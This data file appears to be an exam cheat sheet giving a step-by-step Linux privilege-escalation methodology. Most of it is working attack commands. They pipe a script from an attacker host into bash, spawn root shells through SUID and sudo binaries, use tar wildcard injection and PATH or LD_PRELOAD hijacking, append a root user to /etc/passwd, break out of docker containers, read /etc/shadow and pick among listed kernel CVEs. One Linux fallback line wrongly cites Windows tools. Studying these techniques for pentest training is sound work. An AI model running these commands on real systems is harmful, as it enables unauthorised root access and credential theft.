name: Argha Dey Linux Privilege Escalation Methodology
description: Recommended Exam-Day Workflow: id && sudo -l && uname -a → LinPEAS → SUID/SGID → sudo rules → cron → kernel CVEs → password hunting → container breakout. Includes A-Z technique catalogue and kernel exploit catalogue (Dirty COW, Dirty Pipe, PwnKit, Baron Samedit, OverlayFS, Netfilter, PolicyKit, Dirty Sock).
examHabits: Run LinPEAS and review high/red-flagged items first
Check SUID/SGID binaries with find / -perm -4000 -type f 2>/dev/null
Check sudo rules with sudo -l against GTFOBins
Check cron jobs with pspy (monitor without root)
Cross-check kernel/sudo/polkit version against known CVEs (Dirty Pipe, PwnKit, Baron Samedit)
Check for password/config file leftovers and reused SSH keys
If in docker/lxd group: container breakout via docker run -v /:/mnt --rm -it alpine chroot /mnt sh
Always verify kernel/software version and patch level first — kernel exploits can crash the target
Understand the manual compilation path, not just Metasploit — CPENT exam often doesn't provide Metasploit access
quickRef: id && sudo -l && uname -a → linpeas.sh → find / -perm -4000 → getcap -r / → cat /etc/crontab → searchsploit linux kernel <version>

decisionPoints.action: id; whoami; uname -a; cat /etc/os-release; cat /proc/version; sudo -l; cat /etc/passwd; cat /etc/group; groups
decisionPoints.fallback: If LinPEAS not available: ps aux; ss -tulpn; env; echo $PATH; history

decisionPoints.action: curl http://<attacker>/linpeas.sh | bash; review red-flagged items first
decisionPoints.fallback: Linux Exploit Suggester (les.sh) to narrow down CVEs by kernel/sudo version

decisionPoints.action: Check each against GTFOBins for known exploitation one-liners (e.g., find / -exec /bin/sh -p \; -quit if find has SUID)
decisionPoints.fallback: Run binary with special args: nmap --interactive, vim -c '!bash', awk 'BEGIN {system("/bin/sh")}'

decisionPoints.action: Check if binary can spawn shell: sudo vim -c ':!/bin/sh'; sudo less /etc/hosts then type !/bin/sh
decisionPoints.fallback: Wildcard injection: sudo /usr/bin/php* or path traversal in sudoers

decisionPoints.condition: Scripts run by root are world-writable
decisionPoints.action: Overwrite script with reverse shell payload; wait for cron to fire
decisionPoints.fallback: Wildcard injection in tar/rsync cron: echo '' > --checkpoint=1; echo '' > --checkpoint-action=exec=sh shell.sh

decisionPoints.condition: Root-executed script calls binary without absolute path
decisionPoints.action: PATH hijack: echo '/bin/bash' > /tmp/ls; chmod +x /tmp/ls; export PATH=/tmp:$PATH
decisionPoints.fallback: LD_PRELOAD: check sudo -l for env_keep+=LD_PRELOAD; craft malicious .so loading as root

decisionPoints.action: getcap -r / → find cap_setuid+ep on python/perl; exploit: /usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
decisionPoints.fallback: Find writable /etc/passwd → append root user: openssl passwd -1 -salt abc password123; echo 'hacker:$1$abc$hash:0:0:root:/root:/bin/bash' >> /etc/passwd

steps.phase: Phase 7 - Password Hunting & SSH Key Reuse

decisionPoints.action: grep -r 'password' /etc /var /opt 2>/dev/null; find / -name '*.bak' -o -name '*.old' -o -name '*config*' 2>/dev/null; cat ~/.bash_history; cat /var/log/*.log | grep -i pass
decisionPoints.fallback: find / -name authorized_keys 2>/dev/null; find / -name id_rsa 2>/dev/null — check for reused keys

decisionPoints.action: showmount -e <target>; mount NFS; create root-owned SUID binary on attacker, copy to share, it retains root privileges

decisionPoints.condition: User in docker group (id shows docker)
decisionPoints.fallback: LXD group: build privileged container image, mount host /

decisionPoints.action: Cross-reference: CVE-2016-5195 (Dirty COW, <4.8.3); CVE-2022-0847 (Dirty Pipe, 5.8-5.16.10); CVE-2021-4034 (PwnKit/PKEXEC); CVE-2021-3156 (Baron Samedit/sudo); CVE-2021-3493 (OverlayFS); CVE-2022-25636 (Netfilter); CVE-2021-3560 (PolicyKit); CVE-2019-7304 (Dirty Sock/Snapd)
decisionPoints.fallback: Only attempt if OS is unpatched; document patch level match carefully first (wmic qfe) — kernel exploits can BSOD a box

decisionPoints.action: use post/multi/recon/local_exploit_suggester; set SESSION <id>; or use exploit/linux/local/* modules
decisionPoints.fallback: Manual: searchsploit <cve> → fetch PoC → compile → execute (gcc -pthread, make, etc.)

decisionPoints.action: cat /etc/shadow; hostname; id (confirm uid=0); find / -name flag.txt -o -name root.txt 2>/dev/null
decisionPoints.fallback: python3 -c 'import pty; pty.spawn("/bin/bash")' for stable root shell
